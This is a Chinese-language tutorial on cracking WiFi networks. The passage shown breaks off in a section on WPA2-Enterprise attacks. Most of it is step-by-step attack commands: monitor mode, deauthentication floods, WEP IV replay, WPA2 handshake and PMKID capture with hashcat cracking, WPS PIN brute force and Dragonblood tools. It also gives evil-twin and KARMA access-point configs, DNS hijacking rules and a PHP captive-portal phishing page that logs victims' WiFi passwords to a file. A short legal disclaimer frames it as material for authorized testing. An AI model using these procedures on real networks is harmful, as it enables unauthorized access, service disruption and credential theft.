# WiFi 破解完全指南

> 从基础到高级的无线网络安全测试技术
> 基于 2024/2025 最新技术和工具

---

## 目录

1. [无线网络基础](#1-无线网络基础)
2. [环境准备](#2-环境准备)
3. [信息收集与侦察](#3-信息收集与侦察)
4. [WEP 破解](#4-wep-破解)
5. [WPA/WPA2 破解](#5-wpawpa2-破解)
6. [WPA3 攻击](#6-wpa3-攻击)
7. [高级攻击技术](#7-高级攻击技术)
8. [自动化工具](#8-自动化工具)
9. [防御与检测](#9-防御与检测)
10. [实战案例](#10-实战案例)
11. [常见错误与解决](#11-常见错误与解决)

---

## 1. 无线网络基础

### 1.1 WiFi 标准演进

在开始学习 WiFi 破解之前，我们需要了解 WiFi 技术的发展历程。不同的 WiFi 标准有不同的安全特性和漏洞。

```
┌─────────────────────────────────────────────────────────────────────┐
│ WiFi 标准演进                                                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 802.11b (1999) - WiFi 1                                             │
│ • 2.4GHz 频段                                                       │
│ • 最高 11Mbps                                                       │
│ • 使用 WEP 加密（已不安全）                                          │
│                                                                      │
│ 802.11a (1999) - WiFi 2                                             │
│ • 5GHz 频段                                                         │
│ • 最高 54Mbps                                                       │
│                                                                      │
│ 802.11g (2003) - WiFi 3                                             │
│ • 2.4GHz 频段                                                       │
│ • 最高 54Mbps                                                       │
│ • 向后兼容 802.11b                                                  │
│                                                                      │
│ 802.11n (2009) - WiFi 4                                             │
│ • 2.4GHz 和 5GHz 双频                                               │
│ • 最高 600Mbps                                                      │
│ • 引入 MIMO 技术                                                    │
│                                                                      │
│ 802.11ac (2013) - WiFi 5                                            │
│ • 5GHz 频段                                                         │
│ • 最高 6.9Gbps                                                      │
│ • MU-MIMO 技术                                                      │
│                                                                      │
│ 802.11ax (2019) - WiFi 6/6E                                         │
│ • 2.4GHz、5GHz、6GHz 频段                                           │
│ • 最高 9.6Gbps                                                      │
│ • OFDMA、WPA3                                                       │
│                                                                      │
│ 802.11be (2024) - WiFi 7                                            │
│ • 2.4GHz、5GHz、6GHz 频段                                           │
│ • 最高 46Gbps                                                       │
│ • MLO（多链路操作）                                                 │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.2 WiFi 安全协议

```
┌─────────────────────────────────────────────────────────────────────┐
│ WiFi 安全协议对比                                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ WEP (Wired Equivalent Privacy) - 1997                               │
│ • 使用 RC4 流密码                                                   │
│ • 24位 IV（初始化向量）                                             │
│ • 严重安全漏洞，几分钟内可破解                                       │
│ • 已废弃，不应使用                                                  │
│                                                                      │
│ WPA (WiFi Protected Access) - 2003                                  │
│ • 使用 TKIP（临时密钥完整性协议）                                   │
│ • 48位 IV，改进了 WEP 的缺陷                                        │
│ • 仍有安全问题，不推荐使用                                          │
│                                                                      │
│ WPA2 (2004) - 目前最常见                                            │
│ • 使用 AES-CCMP 加密                                                │
│ • 128位密钥                                                         │
│ • 支持 PSK（预共享密钥）和 Enterprise 模式                          │
│ • 存在 KRACK 漏洞（已修复）                                         │
│ • 可通过字典攻击破解弱密码                                          │
│                                                                      │
│ WPA3 (2018) - 最新标准                                              │
│ • 使用 SAE（同时认证等价）替代 PSK                                  │
│ • 192位安全套件（Enterprise）                                       │
│ • 前向保密                                                          │
│ • 防止离线字典攻击                                                  │
│ • 存在 Dragonblood 漏洞（部分已修复）                               │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.3 WiFi 认证过程

理解 WiFi 的认证过程对于破解至关重要。以下是 WPA2-PSK 的四次握手过程：

```
┌─────────────────────────────────────────────────────────────────────┐
│ WPA2-PSK 四次握手                                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  客户端 (STA)                              接入点 (AP)              │
│      │                                          │                   │
│      │  ←─────── Message 1 (ANonce) ──────────  │                   │
│      │           AP 发送随机数 ANonce            │                   │
│      │                                          │                   │
│      │  ─────── Message 2 (SNonce, MIC) ─────→  │                   │
│      │           客户端发送 SNonce 和消息完整性码│                   │
│      │           此时双方都可以计算 PTK          │                   │
│      │                                          │                   │
│      │  ←─────── Message 3 (GTK, MIC) ────────  │                   │
│      │           AP 发送组临时密钥 GTK          │                   │
│      │                                          │                   │
│      │  ─────── Message 4 (ACK) ──────────────→ │                   │
│      │           客户端确认                      │                   │
│      │                                          │                   │
│                                                                      │
│ 密钥派生过程:                                                        │
│ PMK = PBKDF2(Password, SSID, 4096, 256)                             │
│ PTK = PRF(PMK, ANonce, SNonce, AP_MAC, STA_MAC)                     │
│                                                                      │
│ 破解原理:                                                            │
│ 捕获四次握手后，可以离线尝试不同密码计算 PMK，                       │
│ 然后验证 MIC 是否匹配，从而破解密码。                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.4 法律声明

```
⚠️ 重要提醒 ⚠️

本笔记仅供合法的安全测试和学习使用：

✓ 合法场景：
  • 测试自己的无线网络
  • 获得书面授权的渗透测试
  • 安全研究和教育目的
  • CTF 比赛

✗ 非法行为：
  • 未经授权访问他人网络
  • 窃取他人网络流量
  • 任何违反当地法律的行为

未经授权破解他人 WiFi 是违法行为，可能面临刑事处罚！
```

---

## 2. 环境准备

### 2.1 硬件要求

进行 WiFi 安全测试需要支持监听模式和数据包注入的无线网卡。

```
┌─────────────────────────────────────────────────────────────────────┐
│ 推荐的无线网卡                                                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 入门级（2.4GHz）:                                                   │
│ • Alfa AWUS036ACH (RTL8812AU) - 双频，性能好                        │
│ • Alfa AWUS036ACHM (MT7612U) - 双频，Linux 支持好                   │
│ • TP-Link TL-WN722N v1 (AR9271) - 经典款，仅 2.4GHz                 │
│   注意：v2/v3 版本芯片不同，不支持监听模式                          │
│                                                                      │
│ 专业级（双频/三频）:                                                │
│ • Alfa AWUS036AXM (MT7921AU) - WiFi 6，最新                         │
│ • Alfa AWUS1900 (RTL8814AU) - 4x4 MIMO，高功率                      │
│ • Panda PAU09 (RT5572) - 双频，稳定                                 │
│                                                                      │
│ 芯片选择建议:                                                        │
│ • Atheros AR9271 - 最稳定，但仅 2.4GHz                              │
│ • Ralink RT3070 - 稳定，仅 2.4GHz                                   │
│ • Realtek RTL8812AU - 双频，需要安装驱动                            │
│ • MediaTek MT7612U - 双频，Linux 原生支持好                         │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 2.2 软件环境

```bash
# 推荐使用 Kali Linux，已预装大部分工具

# 更新系统
sudo apt update && sudo apt upgrade -y

# 安装 aircrack-ng 套件（通常已预装）
sudo apt install aircrack-ng -y

# 安装其他有用的工具
sudo apt install -y \
    reaver \           # WPS 破解
    bully \            # WPS 破解（替代）
    wifite \           # 自动化工具
    hashcat \          # GPU 密码破解
    hcxtools \         # 捕获和转换工具
    hcxdumptool \      # 现代捕获工具
    mdk4 \             # 无线攻击工具
    hostapd-wpe \      # 伪造 AP
    freeradius-wpe \   # 企业级攻击
    wireshark          # 数据包分析

# 安装 RTL8812AU 驱动（如果使用该芯片）
sudo apt install realtek-rtl88xxau-dkms -y

# 或手动编译驱动
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
sudo make dkms_install
```

### 2.3 检查无线网卡

```bash
# 查看无线网卡
iwconfig

# 或使用
iw dev

# 查看网卡详细信息
iw phy phy0 info

# 检查是否支持监听模式
iw list | grep -A 10 "Supported interface modes"
# 应该看到 "monitor" 模式

# 检查是否支持数据包注入
aireplay-ng --test wlan0

# 查看网卡芯片信息
lsusb  # USB 网卡
lspci  # PCI 网卡

# 查看驱动信息
ethtool -i wlan0
```

### 2.4 启用监听模式

监听模式（Monitor Mode）允许网卡捕获所有无线数据包，而不仅仅是发给自己的。

```bash
# 方法 1: 使用 airmon-ng（推荐）

# 检查并杀死可能干扰的进程
sudo airmon-ng check kill

# 启用监听模式
sudo airmon-ng start wlan0
# 网卡名称会变成 wlan0mon

# 验证
iwconfig wlan0mon
# 应该显示 Mode:Monitor

# 停止监听模式
sudo airmon-ng stop wlan0mon

# 方法 2: 手动设置

# 关闭网卡
sudo ip link set wlan0 down

# 设置监听模式
sudo iw dev wlan0 set type monitor

# 启动网卡
sudo ip link set wlan0 up

# 验证
iw dev wlan0 info

# 恢复管理模式
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up

# 方法 3: 使用 iwconfig

sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### 2.5 设置信道和功率

```bash
# 设置信道
sudo iwconfig wlan0mon channel 6

# 或使用 iw
sudo iw dev wlan0mon set channel 6

# 设置 5GHz 信道（需要支持）
sudo iw dev wlan0mon set channel 36

# 查看当前信道
iwlist wlan0mon channel

# 设置发射功率（某些地区可能违法）
sudo iwconfig wlan0mon txpower 30
# 或
sudo iw dev wlan0mon set txpower fixed 3000  # 单位是 mBm

# 查看当前功率
iwconfig wlan0mon | grep Tx-Power

# 查看支持的功率范围
iw reg get
```

---

## 3. 信息收集与侦察

### 3.1 扫描周围网络

```bash
# 使用 airodump-ng 扫描
sudo airodump-ng wlan0mon

# 输出说明:
# BSSID - AP 的 MAC 地址
# PWR - 信号强度（越大越好，-30 最强，-90 很弱）
# Beacons - 信标帧数量
# #Data - 数据包数量
# #/s - 每秒数据包
# CH - 信道
# MB - 最大速率
# ENC - 加密类型（WEP/WPA/WPA2/WPA3/OPN）
# CIPHER - 加密算法（CCMP/TKIP）
# AUTH - 认证类型（PSK/MGT）
# ESSID - 网络名称

# 只扫描 2.4GHz
sudo airodump-ng wlan0mon --band bg

# 只扫描 5GHz
sudo airodump-ng wlan0mon --band a

# 扫描所有频段
sudo airodump-ng wlan0mon --band abg

# 只显示 WPA2 网络
sudo airodump-ng wlan0mon --encrypt wpa2

# 只显示特定 ESSID
sudo airodump-ng wlan0mon --essid "TargetNetwork"

# 保存扫描结果
sudo airodump-ng wlan0mon -w scan_results --output-format csv,pcap
```

### 3.2 针对特定目标

```bash
# 锁定目标 AP 和信道
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture

# 参数说明:
# --bssid - 目标 AP 的 MAC 地址
# --channel - 目标信道
# -w - 输出文件前缀

# 输出下半部分显示连接的客户端:
# STATION - 客户端 MAC 地址
# PWR - 客户端信号强度
# Rate - 传输速率
# Lost - 丢失的数据包
# Frames - 帧数
# Notes - 备注
# Probes - 客户端探测的网络

# 使用 wash 扫描启用 WPS 的网络
sudo wash -i wlan0mon

# 输出说明:
# BSSID - AP MAC
# Ch - 信道
# dBm - 信号强度
# WPS - WPS 版本
# Lck - 是否锁定
# Vendor - 厂商
# ESSID - 网络名称
```

### 3.3 使用 hcxdumptool（现代方法）

hcxdumptool 是一个更现代的捕获工具，可以捕获 PMKID 和握手包。

```bash
# 安装
sudo apt install hcxdumptool hcxtools -y

# 扫描网络
sudo hcxdumptool -i wlan0mon --do_rcascan

# 捕获所有网络的握手和 PMKID
sudo hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon --enable_status=15

# 针对特定目标
sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=targets.txt --filtermode=2

# targets.txt 格式（每行一个 MAC）:
# aabbccddeeff
# 112233445566

# 参数说明:
# --active_beacon - 主动发送信标请求
# --enable_status - 显示状态信息
# --filterlist_ap - AP 过滤列表
# --filtermode=2 - 只捕获列表中的 AP

# 转换捕获文件为 hashcat 格式
hcxpcapngtool -o hash.hc22000 capture.pcapng

# 查看捕获的信息
hcxpcapngtool -o hash.hc22000 capture.pcapng --all
```

### 3.4 被动信息收集

```bash
# 使用 Wireshark 分析
wireshark -i wlan0mon -k

# 过滤信标帧
wlan.fc.type_subtype == 0x08

# 过滤探测请求
wlan.fc.type_subtype == 0x04

# 过滤 EAPOL（握手包）
eapol

# 使用 tshark 命令行分析
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.ssid -e wlan.bssid

# 提取隐藏 SSID
# 隐藏 SSID 的 AP 仍会发送信标帧，只是 SSID 字段为空
# 当客户端连接时，探测请求/响应中会包含真实 SSID
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x05" -T fields -e wlan.ssid
```

---

## 4. WEP 破解

WEP（Wired Equivalent Privacy）是最早的 WiFi 加密协议，存在严重的安全漏洞，可以在几分钟内破解。虽然现在很少见，但了解其原理有助于理解无线安全的演进。

### 4.1 WEP 漏洞原理

```
┌─────────────────────────────────────────────────────────────────────┐
│ WEP 漏洞原理                                                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ WEP 使用 RC4 流密码加密，密钥由两部分组成：                          │
│ • 24位 IV（初始化向量）- 明文传输                                   │
│ • 40位或104位密钥                                                   │
│                                                                      │
│ 主要漏洞：                                                           │
│                                                                      │
│ 1. IV 太短（24位）                                                  │
│    • 只有 2^24 = 16,777,216 种可能                                  │
│    • 在繁忙网络中，几小时内就会重复                                 │
│    • IV 重复时，可以通过 XOR 恢复明文                               │
│                                                                      │
│ 2. 弱 IV 问题                                                       │
│    • 某些 IV 值会泄露密钥信息                                       │
│    • FMS 攻击利用这些弱 IV                                          │
│                                                                      │
│ 3. 无重放保护                                                       │
│    • 可以重放捕获的数据包                                           │
│    • 用于生成更多 IV                                                │
│                                                                      │
│ 4. CRC32 校验可预测                                                 │
│    • 可以修改数据包而不被检测                                       │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.2 WEP 破解步骤

```bash
# 步骤 1: 启用监听模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 步骤 2: 扫描 WEP 网络
sudo airodump-ng wlan0mon --encrypt wep

# 步骤 3: 锁定目标并捕获数据包
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 -w wep_capture

# 步骤 4: 生成流量（如果网络不活跃）
# 方法 A: 伪造认证
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
# -1 表示伪造认证
# -a 目标 AP MAC
# -h 我们的 MAC（可以伪造）

# 方法 B: ARP 请求重放
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
# -3 表示 ARP 重放攻击
# 这会大量增加 IV 数量

# 方法 C: 交互式数据包重放
sudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# 步骤 5: 破解密钥
# 需要收集足够的 IV（通常 20,000-40,000 个）
sudo aircrack-ng wep_capture-01.cap

# 使用 PTW 攻击（更快，需要更少的 IV）
sudo aircrack-ng -z wep_capture-01.cap

# 指定密钥长度
sudo aircrack-ng -n 64 wep_capture-01.cap   # 64位密钥
sudo aircrack-ng -n 128 wep_capture-01.cap  # 128位密钥
```

### 4.3 无客户端 WEP 破解

当没有客户端连接时，可以使用以下技术：

```bash
# 方法 1: Fragmentation 攻击
# 获取 PRGA（伪随机生成算法输出）
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF wlan0mon

# 使用 PRGA 创建 ARP 包
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 \
    -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet

# 注入 ARP 包
sudo aireplay-ng -2 -r arp_packet wlan0mon

# 方法 2: ChopChop 攻击
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF wlan0mon

# 方法 3: Caffe Latte 攻击（针对客户端）
# 当客户端不在 AP 范围内但在我们范围内时
sudo airbase-ng -c 6 -e "TargetSSID" -W 1 -L wlan0mon
```

---

## 5. WPA/WPA2 破解

WPA/WPA2 是目前最常见的 WiFi 加密协议。与 WEP 不同，WPA2 本身没有严重的加密漏洞，但可以通过捕获握手包进行离线字典攻击。

### 5.1 WPA2 破解原理

```
┌─────────────────────────────────────────────────────────────────────┐
│ WPA2-PSK 破解原理                                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ WPA2-PSK 使用预共享密钥（密码）进行认证。                            │
│ 破解的关键是捕获四次握手中的信息。                                   │
│                                                                      │
│ 破解步骤：                                                           │
│ 1. 捕获四次握手（或 PMKID）                                         │
│ 2. 离线计算：对每个候选密码                                         │
│    a. PMK = PBKDF2(Password, SSID, 4096, 256)                       │
│    b. PTK = PRF(PMK, ANonce, SNonce, AP_MAC, STA_MAC)               │
│    c. 计算 MIC 并与捕获的 MIC 比较                                  │
│ 3. 如果 MIC 匹配，密码正确                                          │
│                                                                      │
│ 破解难度取决于：                                                     │
│ • 密码复杂度                                                        │
│ • 密码长度                                                          │
│ • 是否在字典中                                                      │
│ • 计算资源（CPU/GPU）                                               │
│                                                                      │
│ PMKID 攻击（2018年发现）：                                          │
│ • 不需要捕获完整握手                                                │
│ • 不需要等待客户端连接                                              │
│ • 从 AP 的第一个 EAPOL 帧中提取 PMKID                               │
│ • PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)       │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 5.2 捕获握手包

```bash
# 步骤 1: 启用监听模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 步骤 2: 扫描目标
sudo airodump-ng wlan0mon

# 步骤 3: 锁定目标并捕获
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 -w wpa_capture

# 等待客户端连接，或使用解除认证攻击强制重连

# 步骤 4: 解除认证攻击（在另一个终端）
# 针对所有客户端
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 表示解除认证攻击
# 5 表示发送 5 个解除认证包

# 针对特定客户端
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -c 指定客户端 MAC

# 当 airodump-ng 右上角显示 "WPA handshake: AA:BB:CC:DD:EE:FF" 时
# 表示成功捕获握手包

# 验证握手包
aircrack-ng wpa_capture-01.cap
# 应该显示 "1 handshake"

# 使用 cowpatty 验证
cowpatty -r wpa_capture-01.cap -c
```

### 5.3 PMKID 攻击

PMKID 攻击是 2018 年发现的新方法，不需要等待客户端连接。

```bash
# 方法 1: 使用 hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=15

# 等待捕获 PMKID（通常几秒到几分钟）
# 按 Ctrl+C 停止

# 转换为 hashcat 格式
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# 查看捕获的 PMKID 数量
cat pmkid.hc22000 | wc -l

# 方法 2: 使用 hcxtools 的旧方法
sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=target.txt --filtermode=2
hcxpcapngtool -o hash.hc22000 capture.pcapng

# 方法 3: 使用 aircrack-ng 套件
# 首先捕获
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture

# 然后使用 hcxpcapngtool 提取 PMKID
hcxpcapngtool -o pmkid.hc22000 capture-01.cap
```

### 5.4 使用 aircrack-ng 破解

```bash
# 基本字典攻击
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# 指定 BSSID（如果捕获文件包含多个网络）
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap

# 使用多个字典
aircrack-ng -w dict1.txt,dict2.txt,dict3.txt wpa_capture-01.cap

# 使用管道输入（配合密码生成器）
crunch 8 8 0123456789 | aircrack-ng -w - wpa_capture-01.cap

# 使用 John the Ripper 生成密码
john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout | \
    aircrack-ng -w - wpa_capture-01.cap

# 显示进度
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap
# 按任意键显示当前状态

# 使用预计算的 PMK（加速）
# 首先生成 PMK 数据库
airolib-ng pmk_db --import essid essid.txt
airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng pmk_db --batch

# 使用 PMK 数据库破解
aircrack-ng -r pmk_db wpa_capture-01.cap
```

### 5.5 使用 hashcat 破解（GPU 加速）

hashcat 利用 GPU 进行破解，速度比 CPU 快几十到几百倍。

```bash
# 首先转换捕获文件格式
# 旧格式（.hccapx）- hashcat 6.0 之前
cap2hccapx wpa_capture-01.cap wpa_capture.hccapx

# 新格式（.hc22000）- hashcat 6.0+，推荐
hcxpcapngtool -o wpa_capture.hc22000 wpa_capture-01.cap

# 基本字典攻击
hashcat -m 22000 wpa_capture.hc22000 /usr/share/wordlists/rockyou.txt

# 参数说明:
# -m 22000 - WPA-PBKDF2-PMKID+EAPOL 模式
# -m 22001 - 仅 WPA-PMKID-PBKDF2
# -m 2500  - 旧的 WPA/WPA2 模式（.hccapx）

# 显示破解状态
hashcat -m 22000 wpa_capture.hc22000 /usr/share/wordlists/rockyou.txt --status

# 使用规则
hashcat -m 22000 wpa_capture.hc22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# 暴力破解（8位数字）
hashcat -m 22000 wpa_capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 掩码说明:
# ?d - 数字 (0-9)
# ?l - 小写字母 (a-z)
# ?u - 大写字母 (A-Z)
# ?s - 特殊字符
# ?a - 所有字符

# 混合攻击（字典 + 掩码）
hashcat -m 22000 wpa_capture.hc22000 -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d

# 恢复中断的会话
hashcat -m 22000 wpa_capture.hc22000 --restore

# 显示已破解的密码
hashcat -m 22000 wpa_capture.hc22000 --show

# 优化选项
hashcat -m 22000 wpa_capture.hc22000 /usr/share/wordlists/rockyou.txt \
    -O \              # 优化内核
    -w 3 \            # 工作负载（1-4，越高越快但系统响应变慢）
    --force           # 忽略警告
```

### 5.6 使用 John the Ripper 破解

```bash
# 转换格式
wpapcap2john wpa_capture-01.cap > wpa_hash.txt

# 或使用 hcxpcapngtool
hcxpcapngtool -o wpa_hash.txt -j wpa_capture-01.cap

# 基本字典攻击
john --wordlist=/usr/share/wordlists/rockyou.txt wpa_hash.txt

# 使用规则
john --wordlist=/usr/share/wordlists/rockyou.txt --rules wpa_hash.txt

# 增量模式（暴力）
john --incremental wpa_hash.txt

# 显示破解的密码
john --show wpa_hash.txt

# 恢复中断的会话
john --restore
```

### 5.7 WPS 攻击

WPS（WiFi Protected Setup）是一种简化 WiFi 连接的功能，但存在严重安全漏洞。

```bash
# 扫描启用 WPS 的网络
sudo wash -i wlan0mon

# 输出说明:
# Lck - Yes 表示 WPS 被锁定（可能检测到攻击）

# 使用 reaver 进行 PIN 码暴力破解
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# 常用选项
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
    -vv \             # 详细输出
    -K 1 \            # 使用 Pixie Dust 攻击
    -N \              # 不发送 NACK
    -d 1 \            # 延迟（秒）
    -t 1 \            # 超时（秒）
    -r 3:15           # 每 3 次尝试后休息 15 秒

# Pixie Dust 攻击（更快，但不是所有路由器都有效）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# 使用 bully（reaver 的替代）
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Pixie Dust 攻击
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 wlan0mon

# 如果知道 PIN 码的前 4 位
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 1234 -vv
```

---

## 6. WPA3 攻击

WPA3 是最新的 WiFi 安全协议，使用 SAE（Simultaneous Authentication of Equals）替代 PSK，提供更强的安全性。但仍存在一些攻击向量。

### 6.1 WPA3 安全特性

```
┌─────────────────────────────────────────────────────────────────────┐
│ WPA3 安全特性                                                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ SAE (Dragonfly) 握手:                                               │
│ • 基于密码的密钥交换                                                │
│ • 防止离线字典攻击                                                  │
│ • 前向保密                                                          │
│                                                                      │
│ 192位安全套件（Enterprise）:                                        │
│ • 更强的加密算法                                                    │
│ • 适用于高安全需求环境                                              │
│                                                                      │
│ PMF (Protected Management Frames):                                  │
│ • 保护管理帧                                                        │
│ • 防止解除认证攻击                                                  │
│                                                                      │
│ OWE (Opportunistic Wireless Encryption):                            │
│ • 开放网络加密                                                      │
│ • 无需密码也能加密                                                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 6.2 Dragonblood 攻击

Dragonblood 是 2019 年发现的一系列 WPA3 漏洞。

```bash
# Dragonblood 攻击工具
# https://github.com/vanhoefm/dragonslayer

# 安装依赖
sudo apt install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev

# 克隆仓库
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# 编译
make

# 1. 侧信道攻击（时序攻击）
# 通过测量 SAE 握手的响应时间来推断密码信息
sudo ./dragontime -i wlan0mon -a AA:BB:CC:DD:EE:FF

# 2. 降级攻击
# 强制客户端使用 WPA2 而不是 WPA3
# 需要设置伪造 AP

# 3. 拒绝服务攻击
# 发送大量 SAE commit 帧消耗 AP 资源
sudo ./dragonforce -i wlan0mon -a AA:BB:CC:DD:EE:FF

# 注意：大多数现代设备已修复这些漏洞
```

### 6.3 WPA3 过渡模式攻击

许多 AP 同时支持 WPA2 和 WPA3（过渡模式），这可能被利用。

```bash
# 1. 检测过渡模式
sudo airodump-ng wlan0mon
# 查看 ENC 列，如果显示 WPA3 WPA2，则是过渡模式

# 2. 降级攻击
# 创建只支持 WPA2 的伪造 AP
# 客户端可能会连接到伪造 AP 并使用 WPA2

# 使用 hostapd-wpe 创建伪造 AP
# hostapd-wpe.conf:
interface=wlan1
driver=nl80211
ssid=TargetNetwork
channel=6
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP

# 启动伪造 AP
sudo hostapd hostapd-wpe.conf

# 3. 然后对真实 AP 进行解除认证攻击
# 客户端可能会连接到我们的伪造 AP
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## 7. 高级攻击技术

### 7.1 Evil Twin 攻击

Evil Twin 是一种创建伪造 AP 的攻击，用于捕获凭证或进行中间人攻击。

```bash
# 方法 1: 使用 airbase-ng

# 创建伪造 AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# 创建与目标相同的 AP
sudo airbase-ng -e "TargetNetwork" -c 6 -a AA:BB:CC:DD:EE:FF wlan0mon

# 配置网络
sudo ifconfig at0 up
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0

# 启用 IP 转发
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# 配置 DHCP（需要安装 dnsmasq）
# /etc/dnsmasq.conf:
interface=at0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

sudo dnsmasq -C /etc/dnsmasq.conf

# 配置 NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -j ACCEPT

# 方法 2: 使用 hostapd

# hostapd.conf:
interface=wlan1
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0

sudo hostapd hostapd.conf

# 方法 3: 使用 Fluxion（自动化工具）
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo ./fluxion.sh
```

### 7.2 Captive Portal 攻击

创建一个假的登录页面来捕获 WiFi 密码。

```bash
# 使用 Fluxion 自动化
sudo ./fluxion.sh

# 手动设置
# 1. 创建伪造 AP（如上）

# 2. 设置 Web 服务器
sudo apt install apache2 php -y
sudo systemctl start apache2

# 3. 创建钓鱼页面
# /var/www/html/index.php
<?php
if(isset($_POST['password'])) {
    $password = $_POST['password'];
    file_put_contents('/tmp/passwords.txt', $password . "\n", FILE_APPEND);
    header('Location: http://www.google.com');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 50px; }
        input { padding: 10px; margin: 10px; }
        button { padding: 10px 20px; }
    </style>
</head>
<body>
    <h2>WiFi Authentication Required</h2>
    <p>Please enter the WiFi password to continue</p>
    <form method="POST">
        <input type="password" name="password" placeholder="WiFi Password" required><br>
        <button type="submit">Connect</button>
    </form>
</body>
</html>

# 4. 配置 DNS 劫持
# 所有 DNS 请求都指向我们的服务器
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53

# 5. 对真实 AP 进行解除认证攻击
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### 7.3 KARMA 攻击

KARMA 攻击利用客户端的探测请求，自动响应任何 SSID。

```bash
# 使用 hostapd-mana
# https://github.com/sensepost/hostapd-mana

# 安装
sudo apt install hostapd-mana -y

# 配置文件 mana.conf:
interface=wlan1
driver=nl80211
ssid=FreeWiFi
channel=6

# MANA 设置
mana_wpaout=/tmp/mana_wpa.hccapx
mana_credout=/tmp/mana_creds.txt
mana_eapol=1
mana_eapsuccess=1
mana_eaptls=1
mana_wpe=1

# 启动
sudo hostapd-mana mana.conf

# 使用 WiFi-Pumpkin（图形化工具）
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3
sudo python3 setup.py install
sudo wifipumpkin3
```

### 7.4 企业级 WiFi 攻击（WPA2-Enterprise）

WPA2-Enterprise 使用 RADIUS 服务器进行认证，通常使用 EAP 协议。

```bash
# 1. 设置伪造 RADIUS 服务器
